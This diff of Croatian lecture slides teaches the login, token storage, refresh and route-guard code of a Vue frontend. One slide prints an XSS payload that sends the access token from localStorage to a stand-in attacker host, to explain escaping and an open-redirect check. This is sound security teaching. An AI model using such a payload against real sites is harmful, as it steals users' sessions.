+Kad backend ne radi, odgovara posrednik, svojom stranicom ili praznim tijelom. Tijelo tada ne prolazi pretvorbu iz JSON-a i nema polja \texttt{code}.
+
+\vspace{0.9em}
+Funkcija \texttt{toApiError} u \codefile{api/http.ts} takav odgovor korisniku ne prikazuje. Pogreška dobiva kod \texttt{http\_error} i poruku prema statusu: za \texttt{502} do \texttt{504} da poslužitelj trenutno ne odgovara, a za ostale statusni kod.
+
+\vspace{0.9em}
+Korisnik tako uvijek dobiva rečenicu na hrvatskom, a ne HTML posrednika.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Pozivi po resursu}
+\begin{lstlisting}[language=typescript]
+// src/api/auth.ts
+export function login(username: string,
+                      password: string): Promise<TokenPair> {
+  return request('POST', '/auth/login',
+                 { body: { username, password }, auth: false })
+}
+export function fetchMe(): Promise<User> {
+  return request('GET', '/auth/me')
+}
+\end{lstlisting}
+
+\vspace{0.3em}
+Funkcija \texttt{request} iz \codefile{api/http.ts} šalje zahtjev i vraća tijelo odgovora s opisanim tipom. Datoteka po resursu skuplja njegove pozive: \codefile{api/auth.ts} prijavu, \codefile{api/competitions.ts} natjecanja.
+
+\vspace{0.3em}
+Komponenta ne zna ni adresu ni zaglavlja, nego samo to da postoji funkcija koja vraća korisnika.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Adresa bez kose crte na kraju (I)}
+Rute popisa na backendu završavaju kosom crtom. Zahtjev bez nje, poslan kroz posrednika:
+
+\begin{lstlisting}
+GET /api/competitions?limit=100
+
+HTTP/1.1 307 Temporary Redirect
+location: http://127.0.0.1:5173/competitions/?limit=100
+\end{lstlisting}
+
+\vspace{0.5em}
+Backend odgovara preusmjerenjem na adresu s kosom crtom. Adresu sastavlja iz zaglavlja \texttt{Host}, u kojem je izvor stranice, i iz putanje koju je primio.
+
+\vspace{0.5em}
+Putanja je stigla bez \texttt{/api}, jer ga je posrednik uklonio. Preusmjerenje tako vodi na adresu stranice bez predmetka.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Adresa bez kose crte na kraju (II)}
+Preglednik preusmjerenje slijedi sam, bez znanja skripte, i šalje zahtjev na \texttt{/competitions/} na izvoru stranice. Ta adresa ne počinje s \texttt{/api}, pa je posrednik ne prosljeđuje backendu, a odgovor nije popis natjecanja.
+
+\vspace{0.5em}
+Zato sve adrese popisa u klijentu završavaju kosom crtom, kao rute na backendu:
+
+\begin{lstlisting}[language=typescript]
+// src/api/competitions.ts
+<@\komts{Adrese popisa završavaju kosom crtom, kao rute na backendu.}@>
+...
+export function fetchCompetitions(): Promise<Competition[]> {
+  return request('GET', '/competitions/', { query: { limit: 100 } })
+}
+\end{lstlisting}
+
+\vspace{0.3em}
+Isti zahtjev poslan izravno backendu ne bi pokazao kvar, jer bi preusmjerenje vodilo na ispravnu adresu.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Čekanje odgovora}
+\begin{lstlisting}[language=typescript]
+// src/views/CompetitionsView.vue, <script setup>
+const competitions = ref<Competition[]>([])
+const loading = ref(false)
+async function load() {
+  loading.value = true
+  try {
+    competitions.value = await fetchCompetitions()
+  } finally {
+    loading.value = false
+  }
+}
+onMounted(load)
+\end{lstlisting}
+
+\vspace{0.3em}
+\texttt{await} zaustavlja samo funkciju \texttt{load}. Preglednik za to vrijeme iscrtava prikaz i odgovara na klikove, pa stanje \texttt{loading} mora biti vidljivo u predlošku. \texttt{finally} ga vraća i kad zahtjev ne uspije.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Vježba: sloj za zahtjeve}
+Prijavljeni ste kao klub \texttt{behemot@plreg.hr}, s otvorenom karticom Mreža. Sloj za zahtjeve uvozi se u konzoli kao modul razvojnog poslužitelja:
+
+\begin{lstlisting}[language=typescript]
+const { request } = await import('/src/api/http.ts')
+await request('GET', '/competitions/9999').catch((e) => e)     // A
+await request('GET', '/competitions/', { query: { limit: '' } }) // B
+await request('GET', '/competitions/', { query: { limit: 0 } })  // C
+await fetch('/api/competitions')                                 // D
+\end{lstlisting}
+
+\begin{enumerate}
+  \itemsep0.15em
+  \item Pošaljite A i zabilježite polja \texttt{status}, \texttt{code} i \texttt{message}.
+  \item Pošaljite B i C i usporedite njihove adrese u kartici Mreža.
+  \item Pošaljite D i u kartici Mreža pogledajte status i zaglavlje \texttt{location}.
+  \item Zaustavite backend s \kbd{Ctrl+C}, ponovite A, pa backend ponovno pokrenite.
+\end{enumerate}
+
+\vspace{0.2em}
+Zašto je samo jedan od zahtjeva B i C nosio \texttt{limit}, i tko je odgovorio u četvrtom koraku?
+\end{frame}
+
+% ============================================================
+\sekcija{Prijava i token}{Odgovor na prijavu, napadi na token u pregledniku, mjesto tokena, pohrana prijavljenog korisnika, obrazac za prijavu i povratak na traženu stranicu.}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Odgovor na prijavu}
+Prijava je jedan zahtjev s korisničkim imenom i lozinkom:
+
+\begin{lstlisting}
+POST /api/auth/login
+{"username": "behemot@plreg.hr", "password": "..."}
+
+{"access_token": "eyJhbGciOiJIUzI1NiIs...",
+ "refresh_token": "eyJhbGciOiJIUzI1NiIs...",
+ "token_type": "bearer"}
+\end{lstlisting}
+
+\vspace{0.3em}
+Pristupni token (engl. \emph{access token}) ide uz svaki sljedeći zahtjev i vrijedi kratko, u ovom projektu petnaest minuta. Token za obnovu (engl. \emph{refresh token}) šalje se samo na \texttt{/auth/refresh}, vrijedi dulje, u ovom projektu sedam dana, i daje novi par.
+
+\vspace{0.3em}
+Tko je prijavljen, odgovor ne kaže. To vraća \texttt{GET /auth/me}, prema zapisu u bazi.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Napad koji uzima token}
+Stranica koja tuđi tekst ugradi kao HTML dopušta da se uz njega izvede i skripta. Umjesto imena natjecatelja upisan je ovaj tekst:
+
+\begin{lstlisting}[language=html]
+<img src="x" onerror="fetch('https://napadac.example/?t='
+  + localStorage.getItem('plreg.access_token'))">
+\end{lstlisting}
+
+\vspace{0.4em}
+Ugrađen kao HTML, kod se izvodi u kartici korisnika, s izvorom aplikacije, pa vidi sve što vidi i aplikacija. Takav napad zove se XSS (engl. \emph{cross-site scripting}).
+
+\vspace{0.4em}
+Vue svaki izraz u predlošku, \texttt{\{\{ ... \}\}}, ispisuje kao tekst, pa ovakvo ime ostaje niz znakova. Direktiva \texttt{v-html} to zaobilazi i dolazi u obzir samo za sadržaj kojemu se vjeruje. Projekt je ne koristi.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Kolačić i zahtjev s tuđe stranice}
+Preglednik kolačić šalje uz svaki zahtjev prema adresi kojoj kolačić pripada, osim kad to ograniči atribut \texttt{SameSite}. Šalje ga i kad zahtjev pokrene tuđa stranica.
+
+\vspace{0.9em}
+Obrazac na tuđoj stranici tako može izvesti radnju u ime prijavljenog korisnika. Takav napad zove se CSRF (engl. \emph{cross-site request forgery}).
+
+\vspace{0.9em}
+Preglednik token u zaglavlje \texttt{Authorization} ne dodaje sam. Dodaje ga skripta aplikacije, pa zahtjev koji pokrene tuđa stranica ostaje bez njega. Cijena tog izbora je izloženost XSS-u: token koji čita skripta aplikacije čita i ubačena skripta.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Mjesto tokena u pregledniku}
+\vspace{0.3em}
+\begin{center}
+{\small
+\setlength{\tabcolsep}{6pt}
+\renewcommand{\arraystretch}{1.3}
+\begin{tabular}{@{}L{3.7cm}L{1.9cm}L{2.4cm}L{3.0cm}@{}}
+  \toprule
+   & \textbf{Memorija} & \textbf{\texttt{localStorage}} & \textbf{Kolačić \texttt{HttpOnly}} \\
+  \midrule
+  Nakon osvježavanja & nestaje & ostaje & ostaje \\
+  Čita ga skripta & da & da & ne \\
+  Uz zahtjev ga dodaje & skripta & skripta & preglednik sam \\
+  Otvoren napadu & XSS & XSS & CSRF \\
+  \bottomrule
+\end{tabular}
+}
+\end{center}
+
+\vspace{0.7em}
+Nijedno mjesto nije bez cijene. Razlikuju se po tome tko token može uzeti i koliko dugo vrijedi ono što uzme: token iz memorije nestaje s karticom, a onaj iz \texttt{localStorage} vrijedi do isteka.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Spremanje tokena}
+\begin{lstlisting}[language=typescript]
+// src/api/tokens.ts
+const ACCESS_KEY = 'plreg.access_token'
+const REFRESH_KEY = 'plreg.refresh_token'
+...
+export function saveTokens(pair: TokenPair) {
+  write(ACCESS_KEY, pair.access_token)
+  write(REFRESH_KEY, pair.refresh_token)
+}
+\end{lstlisting}
+
+\texttt{localStorage} pripada izvoru, a na \texttt{http://127.0.0.1:5173} redom rade svi projekti pokrenuti razvojnim poslužiteljem. Ključevi zato nose predmetak aplikacije.
+
+\vspace{0.1em}
+\begin{konvencija}[Izbor, ne pravilo]
+U ovom projektu oba tokena stoje u \texttt{localStorage}, jer prijava mora preživjeti osvježavanje stranice, a backend token prima u zaglavlju.
+\end{konvencija}
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Prijavljeni korisnik}
+\begin{lstlisting}[language=typescript]
+// src/stores/auth.ts
+export const useAuthStore = defineStore('auth', () => {
+  const user = ref<User | null>(null)
+  <@\komts{true kad je restore() završio}@>
+  const ready = ref(false)
+  const isLoggedIn = computed(() => user.value !== null)
+  const isAdmin = computed(() => user.value?.role === 'admin')
+  const clubId = computed(() => user.value?.club_id ?? null)
+  ...
+  return { user, ready, isLoggedIn, isAdmin, clubId,
+           restore, login, forget }
+})
+\end{lstlisting}
+
+\vspace{0.3em}
+Korisnika čitaju navigacija, provjera prije navigacije i gotovo svaki popis, pa stoji u pohrani (engl. \emph{store}) biblioteke Pinia, koju dijele sve komponente. Tokeni ostaju u \codefile{api/tokens.ts}.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Prijava i zaboravljanje}
+\begin{lstlisting}[language=typescript]
+// src/stores/auth.ts
+async function login(username: string, password: string) {
+  saveTokens(await apiLogin(username, password))
+  user.value = await fetchMe()
 }
 
-function odjava() {
-  localStorage.removeItem('access_token')
-  localStorage.removeItem('refresh_token')
-  token.value = null
+function forget() {
+  clearTokens()
   user.value = null
 }
 \end{lstlisting}
 
-\vspace{0.4em}
-Odjava je brisanje pohrane. Izdani token time ne prestaje vrijediti; prestaje biti dostupan ovoj kartici.
+\vspace{0.5em}
+Prijava najprije sprema par tokena, pa tek onda dohvaća korisnika, jer \texttt{GET /auth/me} već nosi novi pristupni token.
+
+\vspace{0.5em}
+\texttt{forget} briše tokene i korisnika iz ove kartice. Izdani token time ne prestaje vrijediti na poslužitelju, nego prestaje biti dostupan aplikaciji.
 \end{frame}
 
 % ------------------------------------------------------------
 \begin{frame}[fragile]{Obrazac za prijavu}
 \begin{lstlisting}[language=html]
-<form @submit.prevent="posalji">
-  <input v-model="username" required>
-  <input v-model="password" type="password" required>
-  <p v-if="greska" class="error">{{ greska }}</p>
-  <button type="submit">Prijava</button>
+<!-- src/views/LoginView.vue -->
+<form @submit.prevent="submit">
+  ...  <!-- oznake polja i omota<@č@>i -->
+  <input id="username" v-model="username"
+         autocomplete="username" required />
+  <input id="password" v-model="password" type="password"
+         autocomplete="current-password" required />
+  <p v-if="error" class="form-error" role="alert">{{ error }}</p>
+  <button class="btn" type="submit" :disabled="pending">...</button>
 </form>
 \end{lstlisting}
 
-\vspace{0.4em}
-Bez \texttt{.prevent} preglednik bi obrazac poslao sam i učitao stranicu ponovno, čime bi pokrenuta aplikacija nestala.
+\vspace{0.3em}
+Bez \texttt{.prevent} preglednik bi obrazac poslao sam i učitao stranicu ispočetka, a s njom bi nestala pokrenuta aplikacija.
 
-\vspace{0.4em}
-Poruka o pogrešci glasi jednako za nepoznato korisničko ime i za krivu lozinku, kao i odgovor poslužitelja. Preciznija poruka odala bi postoji li račun.
+\vspace{0.3em}
+\texttt{autocomplete} govori upravitelju lozinki koje je polje koje. \texttt{role="alert"} čitaču zaslona javlja poruku o pogrešci čim se pojavi.
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}{Vježba: prijava i zahtjev s tokenom}
-Backend je pokrenut, a početni podatci upisani. Radite u konzoli preglednika, na stranici aplikacije.
-
-\vspace{0.8em}
-\begin{enumerate}
-  \itemsep0.4em
-  \item Pošaljite \texttt{POST /auth/login} s računom kluba \texttt{behemot@plreg.hr} i zabilježite oba tokena.
-  \item Pošaljite \texttt{GET /auth/me} bez zaglavlja \texttt{Authorization}.
-  \item Ponovite isti zahtjev sa zaglavljem \texttt{Authorization: Bearer} i pristupnim tokenom.
-  \item Pošaljite \texttt{GET /auth/me} s tokenom za obnovu umjesto pristupnoga.
-\end{enumerate}
-
-\vspace{0.8em}
-Koje ste statuse dobili u drugom i u četvrtom koraku i po čemu ih poslužitelj razlikuje?
-\end{frame}
-
-% ============================================================
-\sekcija{Token koji istekne}{Zahtjev koji prestane prolaziti, presretači zahtjeva i odgovora, obnova tokena i stanje nakon osvježavanja stranice.}
-
-% ------------------------------------------------------------
-\begin{frame}{Zahtjev koji prestane prolaziti}
-Korisnik se prijavio, radio dvadeset minuta i otvorio popis prijava. Zahtjev je isti kao i svi prije njega, a odgovor je \texttt{401}.
-
-\vspace{0.9em}
-Pristupni token vrijedi petnaest minuta. Kratak vijek je namjeran: token koji dospije u tuđe ruke brzo prestaje vrijediti.
-
-\vspace{0.9em}
-Tražiti od korisnika da se svakih petnaest minuta prijavljuje nije rješenje. Zato uz pristupni token postoji i token za obnovu, kojim se dobiva novi par bez lozinke.
-\end{frame}
-
-% ------------------------------------------------------------
-\begin{frame}[fragile]{Zaglavlje na svakom zahtjevu}
-Token se ne dodaje u svakom pozivu. Dodaje ga presretač zahtjeva, na jednom mjestu:
-
+\begin{frame}[fragile]{Slanje obrasca}
 \begin{lstlisting}[language=typescript]
-// api/client.ts
-api.interceptors.request.use((config) => {
-  const token = localStorage.getItem('access_token')
-  if (token) {
-    config.headers.Authorization = `Bearer ${token}`
+// src/views/LoginView.vue
+async function submit() {
+  error.value = ''
+  pending.value = true
+  try {
+    await auth.login(username.value.trim(), password.value)
+    await router.replace(safeRedirect(route.query.redirect))
+  } catch (e) {
+    if (!(e instanceof ApiError)) throw e
+    error.value = e.message
+  } finally {
+    pending.value = false
   }
-  return config
-})
+}
 \end{lstlisting}
 
-\vspace{0.4em}
-Presretač je funkcija kroz koju prolazi svaki zahtjev prije slanja. Pozivi u \codefile{api} ostaju bez spomena tokena, pa se na novom pozivu token ne može zaboraviti.
+\vspace{0.2em}
+Poruka poslužitelja ista je za nepoznato ime i za krivu lozinku, pa ne odaje postoji li račun. \texttt{replace} zamjenjuje adresu obrasca u povijesti preglednika.
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}[fragile]{Obnova pri odgovoru 401}
-Presretač odgovora hvata \texttt{401}, traži novi par tokena i ponavlja izvorni zahtjev:
+\begin{frame}[fragile]{Povratak na traženu stranicu (I)}
+Neprijavljeni korisnik koji otvori \texttt{/natjecatelji} dobiva obrazac na adresi \texttt{/prijava?redirect=/natjecatelji}, a nakon prijave vraća se na \texttt{/natjecatelji}.
 
-\begin{lstlisting}[language=typescript]
-api.interceptors.response.use(
-  (res) => res,
-  async (error) => {
-    const zahtjev = error.config
-    if (error.response?.status !== 401 || zahtjev._ponovljen) {
-      return Promise.reject(error)
-    }
-    zahtjev._ponovljen = true
-    await obnoviTokene()
-    return api(zahtjev)
-  },
-)
+\vspace{0.5em}
+Parametar je u adresi, pa ga može postaviti bilo tko:
+
+\begin{lstlisting}
+http://127.0.0.1:5173/prijava?redirect=https://napadac.example
 \end{lstlisting}
 
-\vspace{0.4em}
-Oznaka \texttt{\_ponovljen} sprječava beskonačan niz: zahtjev koji i nakon obnove dobije \texttt{401} prolazi dalje kao pogreška.
+\vspace{0.5em}
+Kad aplikacija takvu vrijednost preda pregledniku, na primjer s \texttt{window.location.assign}, korisnik se prijavi na pravoj adresi i završi na tuđoj stranici koja izgleda kao njezina. Takav propust zove se otvoreno preusmjeravanje (engl. \emph{open redirect}).
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}{Dva istodobna odgovora 401}
-Prikaz koji se otvara često šalje nekoliko zahtjeva odjednom. Ako je token istekao, svi dobivaju \texttt{401} u istom trenutku.
-
-\vspace{0.7em}
-\begin{itemize}
-  \itemsep0.45em
-  \item Prvi zahtjev pokrene obnovu i dobije novi par tokena.
-  \item Drugi je obnovu pokrenuo prije nego je prvi završio, pa šalje token za obnovu koji je u međuvremenu zamijenjen.
-  \item Njegova obnova ne prolazi i korisnik je odjavljen usred rada.
-\end{itemize}
-
-\vspace{0.7em}
-Obnovu zato pokreće samo prvi zahtjev, a ostali čekaju njezin ishod. U kodu je to jedno obećanje koje se pamti dok obnova traje i na koje se ostali zahtjevi vežu.
-\end{frame}
-
-% ------------------------------------------------------------
-\begin{frame}{Stanje nakon osvježavanja stranice}
-Osvježavanje stranice pokreće aplikaciju ispočetka. Sve što je stajalo u memoriji nestaje, uključujući podatke o prijavljenom korisniku.
-
-\vspace{0.7em}
-\begin{itemize}
-  \itemsep0.45em
-  \item Token je u \texttt{localStorage} i dalje ondje, pa korisnik jest prijavljen.
-  \item Pohrana koju dijele prikazi prazna je, pa provjera prije navigacije vidi neprijavljenog korisnika i vodi ga na obrazac za prijavu.
-\end{itemize}
-
-\vspace{0.7em}
-Zato se pri pokretanju, prije prve navigacije, token pročita iz pohrane i pozove \texttt{GET /auth/me}. Uspješan odgovor popunjava podatke o korisniku, a neuspješan briše pohranu i vodi na prijavu.
-\end{frame}
-
-% ------------------------------------------------------------
-\begin{frame}{Vježba: istekli token}
-Prijavljeni ste u aplikaciji i backend je pokrenut.
-
-\vspace{0.8em}
-\begin{enumerate}
-  \itemsep0.4em
-  \item Otvorite alate za razvoj, karticu s pohranom, i pogledajte oba zapisana tokena.
-  \item Zamijenite nekoliko znakova u \texttt{access\_token} i otvorite prikaz koji dohvaća podatke.
-  \item U kartici Mreža izbrojite koliko je zahtjeva poslano i kojim je redom.
-  \item Zamijenite nekoliko znakova i u \texttt{refresh\_token} i ponovite drugi korak.
-\end{enumerate}
-
-\vspace{0.8em}
-Što se u trećem koraku dogodilo s izvornim zahtjevom i u kojem je koraku korisnik odjavljen?
-\end{frame}
-
-% ============================================================
-\sekcija{Zaštita prikaza i pogreške}{Provjera prije navigacije, podatci uz rutu, granica između sučelja i poslužitelja, obrada pogrešaka na jednom mjestu.}
-
-% ------------------------------------------------------------
-\begin{frame}{Prikaz koji se ne smije otvoriti}
-Neprijavljeni korisnik koji upiše adresu zaštićenog prikaza dobiva stranicu. Prikaz se iscrta, zatraži podatke i dobije \texttt{401}, pa ostane prazan uz poruku o pogrešci.
-
-\vspace{0.9em}
-Podatci nisu izišli, jer ih je poslužitelj odbio. Korisnik je ipak dobio prazan zaslon umjesto obrasca za prijavu.
-
-\vspace{0.9em}
-Isto vrijedi i za klub koji otvori administratorski prikaz: svaki zahtjev s te stranice vraća \texttt{403}, a korisnik ne zna zašto.
-\end{frame}
-
-% ------------------------------------------------------------
-\begin{frame}[fragile]{Provjera prije navigacije}
-Vue Router prije svake promjene adrese poziva funkciju koja smije navigaciju preusmjeriti:
-
+\begin{frame}[fragile]{Povratak na traženu stranicu (II)}
 \begin{lstlisting}[language=typescript]
-router.beforeEach((to) => {
-  const auth = useAuthStore()
-  if (to.name === 'login') return true
-  if (!auth.prijavljen) return { name: 'login' }
-  if (to.meta.samoOrganizator && !auth.organizator) {
-    return { name: 'pocetna' }
-  }
-  return true
-})
-\end{lstlisting}
-
-\vspace{0.4em}
-Vrati li funkcija \texttt{true}, navigacija se nastavlja. Vrati li opis rute, korisnik odlazi na nju.
-\end{frame}
-
-% ------------------------------------------------------------
-\begin{frame}[fragile]{Podatci uz rutu}
-Uvjet se ne piše u provjeru, nego uz rutu na koju se odnosi:
-
-\begin{lstlisting}[language=typescript]
-{
-  path: '/admin',
-  component: AdminLayout,
-  meta: { samoOrganizator: true },
-  children: [
-    { path: 'clubs', component: AdminClubsView },
-  ],
+// src/lib/navigation.ts
+export function safeRedirect(value: unknown): string {
+  if (typeof value !== 'string') return '/'
+  <@\komts{"//host" i "/\textbackslash host" preglednik čita kao adresu}@>
+  <@\komts{drugog domaćina}@>
+  if (!value.startsWith('/') || value.startsWith('//')
+      || value.startsWith('/\\')) return '/'
+  return value
 }
 \end{lstlisting}
 
 \vspace{0.4em}
-Polje \texttt{meta} nosi proizvoljne podatke o ruti i nasljeđuje se na djecu. Provjera time ostaje jedna, a popis zaštićenih prikaza stoji ondje gdje se prikazi i nabrajaju.
+Vrijednost iz adrese je ulaz kao i tijelo zahtjeva, pa se provjerava prije uporabe. Propušta se samo putanja unutar aplikacije, a sve ostalo vodi na početnu stranicu.
+
+\vspace{0.4em}
+Router putanju tumači unutar aplikacije, ali provjera ne smije ovisiti o tome koji će kod vrijednost jednom pročitati.
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}{Sučelje nije zaštita}
-Provjera prije navigacije sprječava da korisnik otvori prikaz koji mu ne pripada. Ne sprječava ga da pošalje zahtjev.
+\begin{frame}{Vježba: prijava i povratak}
+Backend i razvojni poslužitelj rade. Koristite račun kluba \texttt{behemot@plreg.hr}.
 
-\vspace{0.7em}
-\begin{itemize}
-  \itemsep0.45em
-  \item Zahtjev se može poslati iz konzole preglednika, iz alata ili iz tuđeg programa.
-  \item Vrijednost u pohrani preglednika korisnik može promijeniti sam.
-  \item Preuzeti kod aplikacije sadrži sve adrese koje ona poziva.
-\end{itemize}
+\vspace{0.6em}
+\begin{enumerate}
+  \itemsep0.4em
+  \item Odjavite se, pa u adresnu traku upišite \texttt{http://127.0.0.1:5173/natjecatelji}.
+  \item Prijavite se i zabilježite adresu na kojoj je aplikacija završila.
+  \item U alatima za razvoj, kartica Application, pod Local Storage pogledajte zapisane ključeve.
+  \item Odjavite se, otvorite \texttt{/prijava?redirect=//example.com} i prijavite se.
+  \item Odjavite se i pokušajte se prijaviti s krivom lozinkom, pa s korisničkim imenom koje ne postoji.
+\end{enumerate}
 
-\vspace{0.7em}
-Zato provjera u sučelju postoji radi korisnika, a provjera na poslužitelju radi zaštite. \textbf{Podatci koji korisniku ne pripadaju ne izlaze iz poslužitelja}, bez obzira na to što sučelje prikazuje.
+\vspace{0.6em}
+Kamo vas je aplikacija odvela u četvrtom koraku i zašto se poruke u petom koraku ne razlikuju?
+\end{frame}
+
+% ============================================================
+\sekcija{Token koji istekne}{Zahtjev koji prestane prolaziti, obnova i ponavljanje zahtjeva, istodobni zahtjevi s isteklim tokenom, izgubljena prijava i stanje nakon osvježavanja stranice.}
+
+% ------------------------------------------------------------
+\begin{frame}{Zahtjev koji prestane prolaziti}
+Klub se prijavio, radio dvadeset minuta i otvorio popis natjecanja. Zahtjev je isti kao i svi prije njega, a odgovor je \texttt{401} s kodom \texttt{token\_expired}.
+
+\vspace{0.9em}
+Pristupni token vrijedi kratko, u ovom projektu petnaest minuta, i to namjerno: token koji dospije u tuđe ruke uskoro prestaje vrijediti.
+
+\vspace{0.9em}
+Prijava nakon svakog isteka nije prihvatljiva za korisnika. Token za obnovu daje novi par bez lozinke, a klijent ga mora upotrijebiti sam, bez sudjelovanja korisnika.
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}{Gdje se pogreška obrađuje}
+\begin{frame}[fragile]{Obnova i ponavljanje zahtjeva}
+\begin{lstlisting}[language=typescript]
+// src/api/http.ts
+export async function request<T>(
+  method: Method, path: string, options: RequestOptions = {},
+): Promise<T> {
+  let res = await send(method, path, options)
+  if (res.status === 401 && options.auth !== false) {
+    if (await refreshTokens()) res = await send(method, path, options)
+    if (res.status === 401) {
+      clearTokens()
+      onSessionLost()
+    }
+  }
+  ...  <@\komts{ostali neuspjesi: ApiError; inače tijelo odgovora}@>
+}
+\end{lstlisting}
+
+\vspace{0.1em}
+Na \texttt{401} sloj obnavlja token i ponavlja zahtjev. Drugi \texttt{401} ne pokreće novu obnovu, pa beskonačnog niza nema.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Obnova za istodobne zahtjeve (I)}
+Prikaz koji se otvara često šalje nekoliko zahtjeva odjednom. Ako je pristupni token istekao, svi dobivaju \texttt{401} u istom trenutku i svaki pokreće obnovu.
+
+\pause
+\vspace{0.9em}
+Bez dogovora tri zahtjeva šalju tri obnove i dobivaju tri para tokena, a u \texttt{localStorage} ostaje par koji je stigao zadnji.
+
+\vspace{0.9em}
+Backend ovog projekta stari token za obnovu ne poništava, pa sve tri obnove prolaze, a posao je utrostručen. Mnogi poslužitelji pri obnovi stari token poništavaju (engl. \emph{refresh token rotation}), da ukradeni token vrijedi najviše jednom. Uz takav poslužitelj prva obnova uspije, druge dvije dobiju \texttt{401}, a korisnik je odjavljen usred rada.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Obnova za istodobne zahtjeve (II)}
+\begin{lstlisting}[language=typescript]
+// src/api/http.ts
+let refreshing: Promise<boolean> | null = null
+function refreshTokens(): Promise<boolean> {
+  refreshing ??= (async () => {
+    <@\komts{POST /auth/refresh s tokenom za obnovu;}@>
+    <@\komts{true kad je novi par spremljen}@>
+    ...
+  })().finally(() => {
+    refreshing = null
+  })
+  return refreshing
+}
+\end{lstlisting}
+
+\vspace{0.3em}
+Obnova u tijeku pamti se kao jedno obećanje. Operator \texttt{??=} novu obnovu pokreće samo kad nijedna nije u tijeku; ostali zahtjevi dobivaju isto obećanje i čekaju njegov ishod. \texttt{finally} ga briše kad obnova završi.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Izgubljena prijava}
+\begin{lstlisting}[language=typescript]
+// src/main.ts
+setSessionLostHandler(() => {
+  auth.forget()
+  const current = router.currentRoute.value
+  if (!auth.ready || current.meta.public) return
+  notifications.error('Prijava je istekla. Prijavite se ponovno.')
+  router.push({ name: 'login',
+                query: { redirect: current.fullPath } })
+})
+\end{lstlisting}
+
+\vspace{0.4em}
+Kad ni obnova ne uspije, \codefile{api/http.ts} briše tokene i poziva funkciju koju mu je predao \codefile{main.ts}. Sam ne zna za router ni za pohrane, pa ostaje modul bez Vuea.
+
+\vspace{0.4em}
+Korisnik dobiva obavijest i obrazac za prijavu, a nakon prijave se vraća na prikaz na kojem je bio, preko parametra \texttt{redirect}.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Stanje nakon osvježavanja stranice}
+\begin{lstlisting}[language=typescript]
+// src/stores/auth.ts
+function restore(): Promise<void> {
+  restoring ??= (async () => {
+    if (getAccessToken() || getRefreshToken()) {
+      try {
+        user.value = await fetchMe()
+      } catch {
+        user.value = null
+      }
+    }
+    ready.value = true
+  })()
+  return restoring
+}
+\end{lstlisting}
+
+\vspace{0.2em}
+Osvježavanje prazni pohrane, a tokeni ostaju u \texttt{localStorage}, pa se korisnik dohvaća ponovno. Prva navigacija čeka taj ishod.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Vježba: istekli token}
+Prijavljeni ste kao klub \texttt{behemot@plreg.hr}, s otvorenim karticama Mreža i Application. U konzoli je uvezen sloj za zahtjeve:
+
+\begin{lstlisting}[language=typescript]
+const { request } = await import('/src/api/http.ts')
+const all = () => Promise.all([request('GET', '/auth/me'),
+  request('GET', '/competitions/'), request('GET', '/clubs/')])
+\end{lstlisting}
+
+\begin{enumerate}
+  \itemsep0.15em
+  \item Pod Local Storage pokvarite \texttt{plreg.access\_token} i osvježite stranicu.
+  \item U kartici Mreža zabilježite zahtjeve prema \texttt{/api} i njihov redoslijed.
+  \item Ponovno uvezite sloj, pokvarite token, pošaljite \texttt{await all()} i izbrojite obnove.
+  \item U \codefile{src/api/http.ts} zamijenite \texttt{??=} sa \texttt{=} i ponovite treći korak.
+  \item Vratite izvorni redak, pokvarite oba tokena i osvježite stranicu.
+\end{enumerate}
+
+\vspace{0.2em}
+Koliko je obnova bilo u trećem, a koliko u četvrtom koraku, i što bi razlika značila uz poslužitelj koji poništava stari token?
+\end{frame}
+
+% ============================================================
+\sekcija{Zaštita prikaza i pogreške}{Provjera prije navigacije, uvjet zapisan uz rutu, granica zaštite u korisničkom sučelju, mjesto obrade svake pogreške i odjava.}
+
+% ------------------------------------------------------------
+\begin{frame}{Prikaz koji se ne smije otvoriti}
+Neprijavljeni korisnik upiše adresu popisa natjecanja. Prikaz se iscrta, zatraži podatke, dobije \texttt{401} i ostane prazan, uz poruku o pogrešci.
+
+\vspace{0.9em}
+Podatci nisu izašli, jer ih je backend odbio. Korisnik je svejedno dobio prazan prikaz umjesto obrasca za prijavu.
+
+\vspace{0.9em}
+Isto se događa klubu koji otvori administraciju. Svaki zahtjev s te stranice vraća \texttt{403}, a korisnik ne zna zašto.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Provjera prije navigacije}
+\begin{lstlisting}[language=typescript]
+// src/router/index.ts
+router.beforeEach(async (to) => {
+  const auth = useAuthStore()
+  await auth.restore()
+  if (to.meta.public) {
+    if (to.name === 'login' && auth.isLoggedIn)
+      return { name: 'competitions' }
+    return true
+  }
+  if (!auth.isLoggedIn)
+    return { name: 'login', query: { redirect: to.fullPath } }
+  if (to.meta.role && to.meta.role !== auth.user?.role)
+    return { name: 'competitions' }
+  return true
+})
+\end{lstlisting}
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Ishodi provjere}
+Vue Router funkciju predanu u \texttt{beforeEach} poziva prije svake promjene adrese:
+
 \vspace{0.3em}
 \begin{center}
 {\small
 \setlength{\tabcolsep}{6pt}
